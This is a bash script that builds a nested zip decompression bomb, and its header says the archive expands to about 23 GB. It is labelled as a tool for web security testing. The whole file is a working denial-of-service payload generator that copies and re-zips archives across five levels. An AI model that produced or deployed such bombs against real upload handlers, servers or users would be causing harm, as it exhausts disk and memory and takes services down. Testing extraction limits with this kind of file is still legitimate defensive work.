#!/bin/bash
## WARNING - DO NOT DECOMPRESS BOMB.ZIP
## THIS IS DESIGNED BY/FOR WEB SECURITY TEST PURPOSES
## AS IT IS CURRENTLY WRITTEN THIS 'BOMB' DECOMPRESSES INTO 23.02GB IN TOTAL SIZE

width=10   # Number of copies at each depth
depth=5    # Number of recursive depths
tempdir="/tmp/decomp_bomb"
filename="bomb.txt"
zipfile="bomb.zip"

mkdir -p "$tempdir"
cd "$tempdir" || { echo "Failed to switch to directory $tempdir"; exit 1; }

function cleanup {
    echo "Cleaning up temporary zip files..."
    rm -rf "$tempdir"/*-*.zip  || { echo "Failed to clean up directory $tempdir"; exit 1; }
}

# trap to ensure cleanup happens even if the script is interrupted
trap cleanup EXIT

# create the initial file and zip it
function create_initial_file {
    echo "Creating initial file..."
    echo "This is a decompression bomb!" > "$filename"
    zip -q "$zipfile" "$filename" || { echo "Failed to create initial zip"; exit 1; }
}

# remove existing zipfile to ensure script is idempotent
function check_existing_bomb {
    if [[ -f "$zipfile" ]]; then
        echo "No need to stockpile bombs, let's get rid of the existing $zipfile"
        rm -f "$zipfile" || { echo "Failed remove old bomb $zipfile"; exit 1; }
    else
        echo "No existing bombs detecting, let's build a new one."
    fi
}

function create_bomb {
    echo "Building decompression bomb..."
    for ((d=1; d<=depth; d++))
    do
        # Create copies of the zip file at each depth
        for ((w=1; w<width; w++))
        do
            cp "$zipfile" "$d-$w.zip" || { echo "Failed to copy zip file"; exit 1; }
        done

        # Zip all the intermediate files created at the current depth
        zip -q "$zipfile" *.zip || { echo "Failed to zip files"; exit 1; }

        # Remove all intermediate zip files except for zipfile
        rm -f "$d-*.zip"
        rm -f $filename
    done
}

check_existing_bomb
create_initial_file
create_bomb

echo "Decompression bomb created at $tempdir/$zipfile"
